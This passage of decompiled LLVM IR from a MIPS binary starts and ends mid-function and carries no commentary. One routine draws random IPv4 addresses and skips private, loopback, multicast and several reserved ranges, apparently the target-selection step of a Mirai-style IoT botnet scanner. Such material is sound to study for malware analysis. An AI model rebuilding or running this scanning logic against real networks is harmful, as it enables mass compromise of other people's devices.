  %v6_402bc8 = call i32 @function_403f6c(i8* %v7_402b7c, i32 %v2_402bbc)
  store i32 %v6_402bc8, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 %v2_402b74, i32* %a0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_408678.137 to i32), i32* @a1, align 4
  %v6_402be4 = call i32 @function_403f6c(i8* %v7_402b7c, i32 ptrtoint (i32* @global_var_408678.137 to i32))
  store i32 %v6_402be4, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 %v2_402b74, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([27 x i8]* @global_var_408684.138 to i32), i32* @a1, align 4
  %v8_402c00 = call i32 @function_403f6c(i8* %v7_402b7c, i32 ptrtoint ([27 x i8]* @global_var_408684.138 to i32))
  store i32 %v8_402c00, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 %v2_402a38, i32* @a1, align 4
  store i32 %v2_402b74, i32* %a0.global-to-local, align 4
  %v6_402c18 = call i32 @function_403f6c(i8* %v7_402b7c, i32 %v2_402a38)
  store i32 %v6_402c18, i32* @v0, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 %v2_402b74, i32* %a0.global-to-local, align 4
  store i32 0, i32* @s2, align 4
  %v1_402c30 = call i32 @function_403f48()
  store i32 %v1_402c30, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v2_402c3c = ptrtoint i32* %stack_var_-2116 to i32
  store i32 %v2_402c3c, i32* @a0, align 4
  store i32 1024, i32* @a2, align 4
  store i32 %v1_402c30, i32* @s3, align 4
  %v5_402c4c = call i32 @function_404030(i32 %v2_402c3c, i32 0, i32 1024)
  store i32 %v5_402c4c, i32* @v0, align 4
  br label %dec_label_pc_402c5c

dec_label_pc_402c5c:                              ; preds = %dec_label_pc_402b58, %dec_label_pc_402b3c, %dec_label_pc_402a24, %dec_label_pc_402b68
  %v0_402c5c = load i32, i32* %gp.global-to-local, align 4
  %v1_402c5c = add i32 %v0_402c5c, -32588
  %v2_402c5c = inttoptr i32 %v1_402c5c to i32*
  %v3_402c5c = load i32, i32* %v2_402c5c, align 4
  %v1_402c64 = load i32, i32* @s1, align 4
  store i32 %v1_402c64, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_402c5c)
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_402c74 = load i32, i32* @global_var_449cb0.77, align 4
  store i32 %v3_402c74, i32* @t9, align 4
  store i32 300, i32* %a0.global-to-local, align 4
  %v2_402c7c = call i32 @function_4069b0(i32 300)
  store i32 %v2_402c7c, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v2_402c90 = ptrtoint i32* %stack_var_-2276 to i32
  %v1_402cc8 = ptrtoint i32* %stack_var_-2116 to i32
  %v5_402cd4 = bitcast i32* %stack_var_-2116 to i8*
  %v2_402ce8 = ptrtoint i32* %stack_var_-1092 to i32
  %v0_402c9c.pre = load i32, i32* @t9, align 4
  br label %dec_label_pc_402c90

dec_label_pc_402c90:                              ; preds = %dec_label_pc_402c90, %dec_label_pc_402c5c
  %v0_402c9c = phi i32 [ %v3_402ce4, %dec_label_pc_402c90 ], [ %v0_402c9c.pre, %dec_label_pc_402c5c ]
  store i32 %v2_402c90, i32* @s0, align 4
  store i32 %v2_402c90, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_402c9c)
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_402ca8 = load i32, i32* @s1, align 4
  %v1_402ca8 = load i32, i32* @s2, align 4
  %v2_402ca8 = add i32 %v1_402ca8, %v0_402ca8
  store i32 %v2_402ca8, i32* %v0.global-to-local, align 4
  %v3_402cb0 = load i32, i32* @global_var_449b8c.141, align 4
  store i32 %v3_402cb0, i32* @t9, align 4
  %v1_402cb4 = inttoptr i32 %v2_402ca8 to i8*
  %v2_402cb4 = load i8, i8* %v1_402cb4, align 1
  %v3_402cb4 = sext i8 %v2_402cb4 to i32
  store i32 %v2_402c90, i32* %a0.global-to-local, align 4
  %v7_402cbc = call i32 @function_404b90(i32 %v2_402c90, i32 ptrtoint ([3 x i8]* @global_var_4086a0.142 to i32), i32 %v3_402cb4)
  store i32 %v7_402cbc, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 %v1_402cc8, i32* %a0.global-to-local, align 4
  store i32 %v2_402c90, i32* @a1, align 4
  %v1_402cd4 = load i32, i32* @s2, align 4
  %v2_402cd4 = add i32 %v1_402cd4, 1
  store i32 %v2_402cd4, i32* @s2, align 4
  %v6_402cd4 = call i32 @function_403f6c(i8* %v5_402cd4, i32 %v2_402c90)
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_402ce0 = load i32, i32* @s2, align 4
  %v1_402ce0 = load i32, i32* @s3, align 4
  %v2_402ce0 = icmp slt i32 %v0_402ce0, %v1_402ce0
  %v3_402ce0 = zext i1 %v2_402ce0 to i32
  store i32 %v3_402ce0, i32* %v0.global-to-local, align 4
  %v3_402ce4 = load i32, i32* @global_var_449cd8.68, align 4
  store i32 %v2_402ce8, i32* @s1, align 4
  store i32 %v1_402cc8, i32* %s4.global-to-local, align 4
  br i1 %v2_402ce0, label %dec_label_pc_402c90, label %dec_label_pc_402cf0

dec_label_pc_402cf0:                              ; preds = %dec_label_pc_402c90
  store i32 1024, i32* @a2, align 4
  store i32 %v2_402ce8, i32* @a0, align 4
  %v6_402cfc = call i32 @function_404030(i32 %v2_402ce8, i32 0, i32 1024)
  store i32 %v6_402cfc, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 %v2_402ce8, i32* %a0.global-to-local, align 4
  %v3_402d10 = load i32, i32* @global_var_449b78.59, align 4
  store i32 %v3_402d10, i32* @t9, align 4
  %v7_402d18 = bitcast i32* %stack_var_-1092 to i8*
  %v8_402d18 = call i32 @function_403fcc(i8* %v7_402d18, i32 ptrtoint ([71 x i8]* @global_var_4086a4.143 to i32))
  store i32 %v8_402d18, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 %v2_402ce8, i32* %a0.global-to-local, align 4
  store i32 %v1_402cc8, i32* @a1, align 4
  %v6_402d30 = call i32 @function_403f6c(i8* %v7_402d18, i32 %v1_402cc8)
  store i32 %v6_402d30, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 %v2_402ce8, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_4086ec.144 to i32), i32* @a1, align 4
  %v8_402d4c = call i32 @function_403f6c(i8* %v7_402d18, i32 ptrtoint ([5 x i8]* @global_var_4086ec.144 to i32))
  store i32 %v8_402d4c, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 1293, i32* @fp, align 4
  %v0_402d60.pre = load i32, i32* @s6, align 4
  br label %dec_label_pc_402d60

dec_label_pc_402d60:                              ; preds = %dec_label_pc_402a1c, %dec_label_pc_402cf0
  %v1_402d60 = phi i32 [ %v8_402d4c, %dec_label_pc_402cf0 ], [ 1, %dec_label_pc_402a1c ]
  %v0_402d70 = phi i32 [ %v0_402d60.pre, %dec_label_pc_402cf0 ], [ %v0_402a18, %dec_label_pc_402a1c ]
  %stack_var_-56.0 = phi i32 [ %v3_402b14, %dec_label_pc_402cf0 ], [ %tmp77, %dec_label_pc_402a1c ]
  %stack_var_-52.0 = phi i32 [ %v2_402acc, %dec_label_pc_402cf0 ], [ %tmp78, %dec_label_pc_402a1c ]
  %v2_402d60 = icmp eq i32 %v0_402d70, %v1_402d60
  store i32 4, i32* %v0.global-to-local, align 4
  br i1 %v2_402d60, label %dec_label_pc_402d64, label %dec_label_pc_402d70

dec_label_pc_402d64:                              ; preds = %dec_label_pc_402d60
  store i32 24465, i32* @fp, align 4
  br label %dec_label_pc_402d70

dec_label_pc_402d70:                              ; preds = %dec_label_pc_402d60, %dec_label_pc_402d64
  %v2_402d70 = icmp eq i32 %v0_402d70, 4
  br i1 %v2_402d70, label %dec_label_pc_402d74, label %dec_label_pc_403294

dec_label_pc_402d74:                              ; preds = %dec_label_pc_402d70
  %v3_402d78 = load i32, i32* @global_var_449cb8.14, align 4
  store i32 %v3_402d78, i32* @t9, align 4
  store i32 12, i32* %a0.global-to-local, align 4
  %v2_402d80 = call i32 @function_406200(i32 12)
  %v3_402d80 = inttoptr i32 %v2_402d80 to i16*
  store i32 %v2_402d80, i32* %v0.global-to-local, align 4
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 61, i32* %a0.global-to-local, align 4
  %v3_402d90 = load i32, i32* @global_var_449a80.88, align 4
  %v1_402d98 = add i32 %v3_402d90, 9460
  store i32 %v1_402d98, i32* %s0.global-to-local, align 4
  %v2_402da0 = add i32 %v2_402d80, 8
  %v3_402da0 = inttoptr i32 %v2_402da0 to i32*
  store i32 0, i32* %v3_402da0, align 4
  store i32 %v2_402d80, i32* @global_var_449d88.145, align 4
  %v3_402da8 = load i32, i32* @global_var_449a78.2, align 4
  store i32 %v3_402da8, i32* %v1.global-to-local, align 4
  store i16 0, i16* %v3_402d80, align 2
  store i32 %v2_402d80, i32* @global_var_449d8c.146, align 4
  %v2_402db4 = add i32 %v2_402d80, 2
  %v3_402db4 = inttoptr i32 %v2_402db4 to i8*
  store i8 0, i8* %v3_402db4, align 1
  %v0_402dbc = load i32, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_402dbc)
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 31, i32* %a0.global-to-local, align 4
  %v0_402dd8 = load i32, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_402dd8)
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  store i32 10, i32* %a0.global-to-local, align 4
  %v0_402df4 = load i32, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_402df4)
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_402e0c

dec_label_pc_402e0c:                              ; preds = %dec_label_pc_4029e0, %dec_label_pc_402d74
  %stack_var_-56.1 = phi i32 [ %tmp77, %dec_label_pc_4029e0 ], [ %stack_var_-56.0, %dec_label_pc_402d74 ]
  %stack_var_-52.1 = phi i32 [ %tmp78, %dec_label_pc_4029e0 ], [ %stack_var_-52.0, %dec_label_pc_402d74 ]
  store i32 34254, i32* @fp, align 4
  store i32 %v4_4029e8, i32* %s0.global-to-local, align 4
  store i32 0, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_402e1c

dec_label_pc_402e1c:                              ; preds = %dec_label_pc_402e1c.dec_label_pc_402e1c_crit_edge, %dec_label_pc_402e0c
  %v0_402e1c = phi i32 [ %v0_402e1c.pre, %dec_label_pc_402e1c.dec_label_pc_402e1c_crit_edge ], [ %v2_4028f0, %dec_label_pc_402e0c ]
  %v1_402e1c = add i32 %v0_402e1c, -32136
  %v2_402e1c = inttoptr i32 %v1_402e1c to i32*
  %v3_402e1c = load i32, i32* %v2_402e1c, align 4
  call void @__pseudo_call(i32 %v3_402e1c)
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_402e34 = load i32, i32* %s1.global-to-local, align 4
  %v1_402e34 = add i32 %v0_402e34, 1
  store i32 %v1_402e34, i32* %s1.global-to-local, align 4
  %v2_402e38 = load i32, i32* %s0.global-to-local, align 4
  %v3_402e38 = add i32 %v2_402e38, 17
  %v4_402e38 = inttoptr i32 %v3_402e38 to i8*
  store i8 1, i8* %v4_402e38, align 1
  %v0_402e3c = load i32, i32* %s0.global-to-local, align 4
  %v1_402e3c = add i32 %v0_402e3c, 1048
  store i32 %v1_402e3c, i32* %s0.global-to-local, align 4
  %v0_402e40 = load i32, i32* %s1.global-to-local, align 4
  %v1_402e40 = load i32, i32* @s7, align 4
  %v2_402e40 = icmp slt i32 %v0_402e40, %v1_402e40
  %v3_402e40 = zext i1 %v2_402e40 to i32
  store i32 %v3_402e40, i32* %v0.global-to-local, align 4
  store i32 %v1_402e3c, i32* %a0.global-to-local, align 4
  br i1 %v2_402e40, label %dec_label_pc_402e1c.dec_label_pc_402e1c_crit_edge, label %dec_label_pc_402e48

dec_label_pc_402e1c.dec_label_pc_402e1c_crit_edge: ; preds = %dec_label_pc_402e1c
  %v0_402e1c.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_402e1c

dec_label_pc_402e48:                              ; preds = %dec_label_pc_402e1c
  store i32 %v4_4029e8, i32* @s3, align 4
  br label %dec_label_pc_402e58

dec_label_pc_402e58:                              ; preds = %dec_label_pc_403cb0, %dec_label_pc_402e48
  %v0_402e58 = phi i32 [ %v1_403cb4, %dec_label_pc_403cb0 ], [ %v4_4029e8, %dec_label_pc_402e48 ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.9, %dec_label_pc_403cb0 ], [ %tmp70, %dec_label_pc_402e48 ]
  %stack_var_-64.0 = phi i32 [ %v1_403cb8, %dec_label_pc_403cb0 ], [ 0, %dec_label_pc_402e48 ]
  %stack_var_-56.2 = phi i32 [ %stack_var_-56.8, %dec_label_pc_403cb0 ], [ %stack_var_-56.1, %dec_label_pc_402e48 ]
  %stack_var_-52.2 = phi i32 [ %stack_var_-52.8, %dec_label_pc_403cb0 ], [ %stack_var_-52.1, %dec_label_pc_402e48 ]
  %v1_402e58 = add i32 %v0_402e58, 16
  %v2_402e58 = inttoptr i32 %v1_402e58 to i8*
  %v3_402e58 = load i8, i8* %v2_402e58, align 1
  %v4_402e58 = zext i8 %v3_402e58 to i32
  store i32 %v4_402e58, i32* %v1.global-to-local, align 4
  %v1_402e60 = icmp ult i8 %v3_402e58, 16
  %v1_402e64 = icmp eq i1 %v1_402e60, false
  %v3_402e64 = mul nuw nsw i32 %v4_402e58, 4
  store i32 %v3_402e64, i32* %v0.global-to-local, align 4
  br i1 %v1_402e64, label %dec_label_pc_403cb0, label %dec_label_pc_402e68

dec_label_pc_402e68:                              ; preds = %dec_label_pc_402e58
  %v0_402e6c = load i32, i32* %gp.global-to-local, align 4
  %v1_402e6c = add i32 %v0_402e6c, -32740
  %v2_402e6c = inttoptr i32 %v1_402e6c to i32*
  %v3_402e6c = load i32, i32* %v2_402e6c, align 4
  %v1_402e74 = add i32 %v3_402e6c, -27188
  store i32 %v1_402e74, i32* %v1.global-to-local, align 4
  %v2_402e78 = add i32 %v1_402e74, %v3_402e64
  store i32 %v2_402e78, i32* %v0.global-to-local, align 4
  %v1_402e7c = inttoptr i32 %v2_402e78 to i32*
  %v2_402e7c = load i32, i32* %v1_402e7c, align 4
  %v2_402e84 = add i32 %v2_402e7c, %v0_402e6c
  store i32 %v2_402e84, i32* %v0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_402e84)
  %v0_402e90 = load i32, i32* @s3, align 4
  %v1_402e90 = add i32 %v0_402e90, 17
  %v2_402e90 = inttoptr i32 %v1_402e90 to i8*
  %v3_402e90 = load i8, i8* %v2_402e90, align 1
  %v4_402e90 = zext i8 %v3_402e90 to i32
  store i32 %v4_402e90, i32* %v1.global-to-local, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  %v2_402e98 = icmp eq i8 %v3_402e90, 1
  store i32 %v0_402e90, i32* %a0.global-to-local, align 4
  br i1 %v2_402e98, label %dec_label_pc_402e9c, label %dec_label_pc_403074

dec_label_pc_402e9c:                              ; preds = %dec_label_pc_402e68
  %v0_402ea0 = load i32, i32* %gp.global-to-local, align 4
  %v1_402ea0 = add i32 %v0_402ea0, -32136
  %v2_402ea0 = inttoptr i32 %v1_402ea0 to i32*
  %v3_402ea0 = load i32, i32* %v2_402ea0, align 4
  call void @__pseudo_call(i32 %v3_402ea0)
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v0_402eb4 = load i32, i32* @fp, align 4
  %v1_402eb4 = trunc i32 %v0_402eb4 to i16
  %v2_402eb4 = load i32, i32* @s3, align 4
  %v3_402eb4 = add i32 %v2_402eb4, 4
  %v4_402eb4 = inttoptr i32 %v3_402eb4 to i16*
  store i16 %v1_402eb4, i16* %v4_402eb4, align 2
  br label %dec_label_pc_402eb8

dec_label_pc_402eb8:                              ; preds = %dec_label_pc_402fa4, %dec_label_pc_403024, %dec_label_pc_403010, %dec_label_pc_403008, %dec_label_pc_402ffc, %dec_label_pc_402ff0, %dec_label_pc_402fc4, %dec_label_pc_402f60, %dec_label_pc_402f58, %dec_label_pc_402eb8, %dec_label_pc_402e9c
  %v3_402eb8 = load i32, i32* @global_var_449c74.100, align 4
  store i32 %v3_402eb8, i32* @t9, align 4
  store i32 -2139095040, i32* %s0.global-to-local, align 4
  %v1_402ec0 = call i32 @function_401d68()
  %v2_402ec0 = sext i32 %v1_402ec0 to i64
  %v0_402ec8 = load i32, i32* %s0.global-to-local, align 4
  %v1_402ec8 = or i32 %v0_402ec8, 32897
  store i32 %v1_402ec8, i32* %s0.global-to-local, align 4
  %v4_402ecc = zext i32 %v1_402ec8 to i64
  %v5_402ecc = mul nuw nsw i64 %v4_402ecc, %v2_402ec0
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_402ed8 = load i32, i32* @global_var_449c74.100, align 4
  store i32 %v3_402ed8, i32* @t9, align 4
  %v1_402ee06 = udiv i64 %v5_402ecc, 549755813888
  %v1_402ee0 = trunc i64 %v1_402ee06 to i32
  store i32 %v1_402ee0, i32* %v1.global-to-local, align 4
  %v3_402ee4 = add i32 %v1_402ee0, %v1_402ec0
  store i32 %v3_402ee4, i32* %v0.global-to-local, align 4
  %v2_402ee8 = urem i32 %v3_402ee4, 256
  store i32 %v2_402ee8, i32* %s2.global-to-local, align 4
  %v3_402ee8 = call i32 @function_401d68()
  %v4_402ee8 = sext i32 %v3_402ee8 to i64
  %v2_402ef0 = load i32, i32* %s0.global-to-local, align 4
  %v4_402ef0 = zext i32 %v2_402ef0 to i64
  %v5_402ef0 = mul nuw nsw i64 %v4_402ef0, %v4_402ee8
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_402efc = load i32, i32* @global_var_449c74.100, align 4
  store i32 %v3_402efc, i32* @t9, align 4
  %v1_402f048 = udiv i64 %v5_402ef0, 549755813888
  %v1_402f04 = trunc i64 %v1_402f048 to i32
  store i32 %v1_402f04, i32* %v1.global-to-local, align 4
  %v3_402f08 = add i32 %v1_402f04, %v3_402ee8
  store i32 %v3_402f08, i32* %v0.global-to-local, align 4
  %v2_402f0c = urem i32 %v3_402f08, 256
  store i32 %v2_402f0c, i32* %s1.global-to-local, align 4
  %v3_402f0c = call i32 @function_401d68()
  %v4_402f0c = sext i32 %v3_402f0c to i64
  %v2_402f14 = load i32, i32* %s0.global-to-local, align 4
  %v4_402f14 = zext i32 %v2_402f14 to i64
  %v5_402f14 = mul nuw nsw i64 %v4_402f14, %v4_402f0c
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v3_402f20 = load i32, i32* @global_var_449c74.100, align 4
  store i32 %v3_402f20, i32* @t9, align 4
  %v1_402f2810 = udiv i64 %v5_402f14, 549755813888
  %v1_402f28 = trunc i64 %v1_402f2810 to i32
  store i32 %v1_402f28, i32* %v1.global-to-local, align 4
  %v3_402f2c = add i32 %v1_402f28, %v3_402f0c
  store i32 %v3_402f2c, i32* %v0.global-to-local, align 4
  %v2_402f30 = urem i32 %v3_402f2c, 256
  store i32 %v2_402f30, i32* %s4.global-to-local, align 4
  %v3_402f30 = call i32 @function_401d68()
  %v4_402f30 = sext i32 %v3_402f30 to i64
  %v2_402f38 = load i32, i32* %s0.global-to-local, align 4
  %v4_402f38 = zext i32 %v2_402f38 to i64
  %v5_402f38 = mul nuw nsw i64 %v4_402f38, %v4_402f30
  store i32 %v2_4028f0, i32* %gp.global-to-local, align 4
  %v1_402f4412 = udiv i64 %v5_402f38, 549755813888
  %v1_402f44 = trunc i64 %v1_402f4412 to i32
  store i32 %v1_402f44, i32* %s0.global-to-local, align 4
  %v3_402f48 = add i32 %v1_402f44, %v3_402f30
  %v1_402f4c = urem i32 %v3_402f48, 256
  store i32 %v1_402f4c, i32* %a0.global-to-local, align 4
  store i32 127, i32* %v0.global-to-local, align 4
  %v0_402f54 = load i32, i32* %s2.global-to-local, align 4
  %v2_402f54 = icmp eq i32 %v0_402f54, 127
  br i1 %v2_402f54, label %dec_label_pc_402eb8, label %dec_label_pc_402f58

dec_label_pc_402f58:                              ; preds = %dec_label_pc_402eb8
  %v1_402f5c = icmp eq i32 %v0_402f54, 0
  store i32 10, i32* %v0.global-to-local, align 4
  br i1 %v1_402f5c, label %dec_label_pc_402eb8, label %dec_label_pc_402f60

dec_label_pc_402f60:                              ; preds = %dec_label_pc_402f58
  %v2_402f64 = icmp eq i32 %v0_402f54, 10
  store i32 192, i32* %v0.global-to-local, align 4
  br i1 %v2_402f64, label %dec_label_pc_402eb8, label %dec_label_pc_402f68

dec_label_pc_402f68:                              ; preds = %dec_label_pc_402f60
  %v2_402f6c = icmp eq i32 %v0_402f54, 192
  store i32 168, i32* %v0.global-to-local, align 4
  br i1 %v2_402f6c, label %dec_label_pc_402fc4, label %dec_label_pc_402f70

dec_label_pc_402f70:                              ; preds = %dec_label_pc_402f68
  %v2_402f78 = icmp eq i32 %v0_402f54, 172
  store i32 100, i32* %v0.global-to-local, align 4
  br i1 %v2_402f78, label %dec_label_pc_402f7c, label %dec_label_pc_402f94

dec_label_pc_402f7c:                              ; preds = %dec_label_pc_402f70
  %v0_402f80 = load i32, i32* %s1.global-to-local, align 4
  %v1_402f80 = icmp ult i32 %v0_402f80, 16
  %v3_402f84 = icmp ult i32 %v0_402f80, 32
  %v4_402f84 = zext i1 %v3_402f84 to i32
  store i32 %v4_402f84, i32* %v0.global-to-local, align 4
  br i1 %v1_402f80, label %dec_label_pc_403034, label %dec_label_pc_402f94

dec_label_pc_402f94:                              ; preds = %dec_label_pc_402f7c, %dec_label_pc_402f70
  %v1_402f94 = phi i32 [ %v4_402f84, %dec_label_pc_402f7c ], [ 100, %dec_label_pc_402f70 ]
  %v2_402f94 = icmp eq i32 %v0_402f54, %v1_402f94
  store i32 169, i32* %v0.global-to-local, align 4
  br i1 %v2_402f94, label %dec_label_pc_402f98, label %dec_label_pc_402fb8

dec_label_pc_402f98:                              ; preds = %dec_label_pc_402f94
  %v0_402f9c = load i32, i32* %s1.global-to-local, align 4
  %v1_402f9c = icmp ult i32 %v0_402f9c, 64
  %v3_402fa0 = icmp ult i32 %v0_402f9c, 127
  %v4_402fa0 = zext i1 %v3_402fa0 to i32
  store i32 %v4_402fa0, i32* %v0.global-to-local, align 4
  br i1 %v1_402f9c, label %dec_label_pc_403034, label %dec_label_pc_402fa4

dec_label_pc_402fa4:                              ; preds = %dec_label_pc_402f98
  %v1_402fa8 = icmp eq i1 %v3_402fa0, false
  %v3_402fa8 = mul i32 %v0_402f9c, 65536
  store i32 %v3_402fa8, i32* %v0.global-to-local, align 4
  br i1 %v1_402fa8, label %dec_label_pc_402fac, label %dec_label_pc_402eb8

dec_label_pc_402fac:                              ; preds = %dec_label_pc_402fa4
  %v1_402fb4 = mul i32 %v0_402f54, 16777216
  store i32 %v1_402fb4, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_402fb8

dec_label_pc_402fb8:                              ; preds = %dec_label_pc_402f94, %dec_label_pc_402fac
  %v1_402fb8 = phi i32 [ 169, %dec_label_pc_402f94 ], [ %v3_402fa8, %dec_label_pc_402fac ]
  %v2_402fb8 = icmp eq i32 %v0_402f54, %v1_402fb8
  store i32 198, i32* %v0.global-to-local, align 4
  br i1 %v2_402fb8, label %dec_label_pc_402fbc, label %dec_label_pc_402fd4

dec_label_pc_402fbc:                              ; preds = %dec_label_pc_402fb8
  store i32 255, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402fc4

dec_label_pc_402fc4:                              ; preds = %dec_label_pc_402f68, %dec_label_pc_402fbc
  %v1_402fc4 = phi i32 [ 168, %dec_label_pc_402f68 ], [ 255, %dec_label_pc_402fbc ]
  %v0_402fc4 = load i32, i32* %s1.global-to-local, align 4
  %v2_402fc4 = icmp eq i32 %v0_402fc4, %v1_402fc4
  %v4_402fc4 = mul i32 %v0_402fc4, 65536
  store i32 %v4_402fc4, i32* %v0.global-to-local, align 4
  br i1 %v2_402fc4, label %dec_label_pc_402eb8, label %dec_label_pc_402fc8

dec_label_pc_402fc8:                              ; preds = %dec_label_pc_402fc4
  %v1_402fd0 = mul i32 %v0_402f54, 16777216
  store i32 %v1_402fd0, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_402fd4

dec_label_pc_402fd4:                              ; preds = %dec_label_pc_402fb8, %dec_label_pc_402fc8
  %v1_402fd4 = phi i32 [ 198, %dec_label_pc_402fb8 ], [ %v4_402fc4, %dec_label_pc_402fc8 ]
  %v2_402fd4 = icmp eq i32 %v0_402f54, %v1_402fd4
  %v4_402fd4 = icmp ult i32 %v0_402f54, 224
  %v5_402fd4 = zext i1 %v4_402fd4 to i32
  store i32 %v5_402fd4, i32* %v0.global-to-local, align 4
  br i1 %v2_402fd4, label %dec_label_pc_402fd8, label %dec_label_pc_402ff0

dec_label_pc_402fd8:                              ; preds = %dec_label_pc_402fd4
  %v0_402fdc = load i32, i32* %s1.global-to-local, align 4
  %v1_402fdc = icmp ult i32 %v0_402fdc, 18
  %v3_402fe0 = icmp ult i32 %v0_402fdc, 20
  %v4_402fe0 = zext i1 %v3_402fe0 to i32
  store i32 %v4_402fe0, i32* %v0.global-to-local, align 4
  br i1 %v1_402fdc, label %dec_label_pc_403034, label %dec_label_pc_402ff0

dec_label_pc_402ff0:                              ; preds = %dec_label_pc_402fd8, %dec_label_pc_402fd4
  %v0_402ff0 = phi i32 [ %v4_402fe0, %dec_label_pc_402fd8 ], [ %v5_402fd4, %dec_label_pc_402fd4 ]
  %v1_402ff0 = icmp eq i32 %v0_402ff0, 0
  store i32 106, i32* %v0.global-to-local, align 4
  br i1 %v1_402ff0, label %dec_label_pc_402eb8, label %dec_label_pc_402ff4

dec_label_pc_402ff4:                              ; preds = %dec_label_pc_402ff0
  %v2_402ff8 = icmp eq i32 %v0_402f54, 106
  store i32 6, i32* %v0.global-to-local, align 4
  br i1 %v2_402ff8, label %dec_label_pc_402ffc, label %dec_label_pc_403024

dec_label_pc_402ffc:                              ; preds = %dec_label_pc_402ff4
  %v0_403004 = load i32, i32* %s1.global-to-local, align 4
  %v2_403004 = icmp eq i32 %v0_403004, 185
  store i32 187, i32* %v0.global-to-local, align 4
  br i1 %v2_403004, label %dec_label_pc_402eb8, label %dec_label_pc_403008

dec_label_pc_403008:                              ; preds = %dec_label_pc_402ffc
  %v2_40300c = icmp eq i32 %v0_403004, 187
  store i32 184, i32* %v0.global-to-local, align 4
  br i1 %v2_40300c, label %dec_label_pc_402eb8, label %dec_label_pc_403010

dec_label_pc_403010:                              ; preds = %dec_label_pc_403008
  %v2_403014 = icmp eq i32 %v0_403004, 184
  store i32 186, i32* %v0.global-to-local, align 4
  br i1 %v2_403014, label %dec_label_pc_402eb8, label %dec_label_pc_403024

dec_label_pc_403024:                              ; preds = %dec_label_pc_403010, %dec_label_pc_402ff4
  %v1_403024 = phi i32 [ 186, %dec_label_pc_403010 ], [ 6, %dec_label_pc_402ff4 ]
  %v2_403024 = icmp eq i32 %v0_402f54, %v1_403024
  store i32 11, i32* %v0.global-to-local, align 4
  %v2_40302c = icmp eq i32 %v0_402f54, 11
  %or.cond = or i1 %v2_40302c, %v2_403024
  br i1 %or.cond, label %dec_label_pc_402eb8, label %dec_label_pc_403024.dec_label_pc_403034_crit_edge

dec_label_pc_403024.dec_label_pc_403034_crit_edge: ; preds = %dec_label_pc_403024
  %v0_403034.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_403034

dec_label_pc_403034:                              ; preds = %dec_label_pc_402fd8, %dec_label_pc_402f98, %dec_label_pc_402f7c, %dec_label_pc_403024.dec_label_pc_403034_crit_edge
  %v0_402f54112 = phi i32 [ %v0_402f54, %dec_label_pc_403024.dec_label_pc_403034_crit_edge ], [ 172, %dec_label_pc_402f7c ], [ %v0_402f54, %dec_label_pc_402f98 ], [ %v0_402f54, %dec_label_pc_402fd8 ]
  %v0_403034 = phi i32 [ %v0_403034.pre, %dec_label_pc_403024.dec_label_pc_403034_crit_edge ], [ %v0_402f80, %dec_label_pc_402f7c ], [ %v0_402f9c, %dec_label_pc_402f98 ], [ %v0_402fdc, %dec_label_pc_402fd8 ]
  %v1_403034 = mul i32 %v0_403034, 65536
  %v1_403038 = mul i32 %v0_402f54112, 16777216
  %v0_403044 = load i32, i32* %s4.global-to-local, align 4
  %v1_403044 = mul i32 %v0_403044, 256
  %v2_40303c = or i32 %v1_403038, %v1_402f4c
  %v2_403040 = or i32 %v2_40303c, %v1_403034
  %v2_403048 = or i32 %v2_403040, %v1_403044
  %v1_403050 = udiv i32 %v2_403048, 256
  %v1_403054 = udiv i32 %v2_403048, 16777216
  %v1_403058 = and i32 %v1_403050, 65280
  store i32 %v1_403058, i32* %a0.global-to-local, align 4
  %v1_40304c = mul i32 %v0_403044, 65536
  %v1_40305c = and i32 %v1_40304c, 16711680
  %v1_403060 = mul i32 %v3_402f48, 16777216
  %v2_403068 = or i32 %v1_40305c, %v1_403060
  store i32 %v2_403068, i32* %v0.global-to-local, align 4
  %v2_403064 = or i32 %v1_403054, %v2_403068
